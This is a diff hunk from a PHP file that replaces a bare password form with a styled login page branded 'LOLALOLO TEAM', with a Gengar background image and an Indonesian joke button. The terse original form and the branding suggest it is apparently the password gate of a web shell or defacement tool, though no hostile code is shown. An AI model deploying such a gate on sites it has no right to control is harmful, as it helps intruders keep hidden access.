@@ -61,19 +61,128 @@ if (is_logged_in()) {
 } else {
     // Display login form if not logged in
     ?>
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>L</title>
-    </head>
-    <body>
-        <form method="POST" action="">
-            <label for="password">P:</label>
-            <input type="password" id="password" name="password">
-            <input type="submit" value="L">
-        </form>
-    </body>
-    </html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Page</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body, html {
+      height: 100%;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    .container {
+      width: 100%;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-image: url("https://xinztheonly.one/img/gengar.jpeg");
+      padding: 20px;
+    }
+
+    .login-box {
+      background: transparent;
+      border-radius: 12px;
+      padding: 40px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
+    }
+
+    .login-box h2 {
+      margin-bottom: 24px;
+      color: #fff;
+      font-weight: 600;
+      text-align: center;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: 500;
+      color: #fff;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 12px 16px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      outline: none;
+      font-size: 16px;
+    }
+
+    .form-group input:focus {
+      border-color: #667eea;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #667eea;
+      color: white;
+      font-size: 16px;
+      font-weight: 600;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .login-btn:hover {
+      background-color: #5a67d8;
+    }
+
+    .bottom-text {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 14px;
+      color: #666;
+    }
+
+    .bottom-text a {
+      color: #667eea;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .bottom-text a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="login-box">
+      <h2>LOLALOLO TEAM</h2>
+      <form method="POST" action="">
+        <div class="form-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" required>
+        </div>
+        <button type="submit" class="login-btn">Hayo Apa Hayo</button>
+      </form>
+    </div>
+  </div>
+</body>
+</html>
     <?php
 }
 ?>
